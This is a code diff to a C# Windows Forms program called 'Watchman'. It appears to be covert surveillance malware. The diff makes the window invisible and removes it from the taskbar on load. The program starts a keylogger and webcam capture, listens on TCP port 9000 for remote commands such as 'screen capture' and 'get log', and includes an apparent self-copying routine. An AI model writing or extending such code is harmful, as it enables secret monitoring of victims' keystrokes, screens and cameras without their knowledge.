@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -13,28 +12,37 @@ namespace Watchman
 {
     public partial class Form1 : Form
     {
-        private static readonly Socket _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        private static readonly List<Socket> _clientSockets = new List<Socket>();
-        private static readonly byte[] _buffer = new byte[1024];
+        private static readonly Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        private static readonly List<Socket> ClientSockets = new List<Socket>();
+        private static readonly byte[] Buffer = new byte[1024];
         private Camera _cam;
         private KLog _keylog;
 
         public Form1()
         {
             InitializeComponent();
-            _serverSocket.Bind(new IPEndPoint(IPAddress.Any,9000));
-            _serverSocket.Listen(1);
-            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
+            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
+            IPAddress ipAddress = null;
+            foreach (IPAddress ip in ipHostInfo.AddressList)
+            {
+                if (ip.AddressFamily != AddressFamily.InterNetwork) continue;
+                ipAddress = ip;
+                break;
+            }
+            if (ipAddress != null)
+            {
+                IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 9000);
+                ServerSocket.Bind(localEndPoint);
+            }
+            ServerSocket.Listen(1);
+            ServerSocket.BeginAccept(AcceptCallback, null);
         }
         
 
         private void Form1_Load(object sender, EventArgs e)
         {
-
-
-
-            //this.Hide();
-            //this.Opacity = 0;
+            Hide();
+            Opacity = 0;
             ShowInTaskbar = false;
             
             timer1.Enabled = true; 
@@ -43,10 +51,13 @@ namespace Watchman
             timer4.Enabled = true;
 
             _keylog = new KLog();
+        }
+
+        private void StartCam()
+        {
             _cam = new Camera();
             _cam.Connect(pictureBox1, _cam.Devices[0]);
         }
-
         private void CopyApplication(string location)
         {
             String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
@@ -97,11 +108,11 @@ namespace Watchman
         #region Remote
         private static void AcceptCallback(IAsyncResult iar)
         {
-            Socket socket = _serverSocket.EndAccept(iar);
-            _clientSockets.Add(socket);
-            socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
+            Socket socket = ServerSocket.EndAccept(iar);
+            ClientSockets.Add(socket);
+            socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReceiveCallback, socket);
 
-            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
+            ServerSocket.BeginAccept(AcceptCallback, null);
         }
 
         private static void ReceiveCallback(IAsyncResult iar)
@@ -112,14 +123,18 @@ namespace Watchman
                 int received = socket.EndReceive(iar);
                 byte[] dataBuffer = new byte[received];
 
-                Array.Copy(_buffer, dataBuffer, received);
-                //Text received
+                Array.Copy(Buffer, dataBuffer, received);
                 string text = Encoding.ASCII.GetString(dataBuffer);
 
-                byte[] data = null;
+                byte[] data;
                 if (text.ToLower() == "screen capture")
                 {
                     data = KLog.RemoteTakeScreen();
+                }
+                else if (text.ToLower() == "get log")
+                {
+                    //TODO: Get Data
+                    data = Encoding.ASCII.GetBytes("Unknown request");
                 }
                 else
                 {
@@ -127,8 +142,8 @@ namespace Watchman
                 }
 
                 //Do your thing then
-                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
-                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback),
+                socket.BeginSend(data, 0, data.Length, SocketFlags.None, SendCallback, socket);
+                socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReceiveCallback,
                                     socket);
             }
             catch (ObjectDisposedException e)
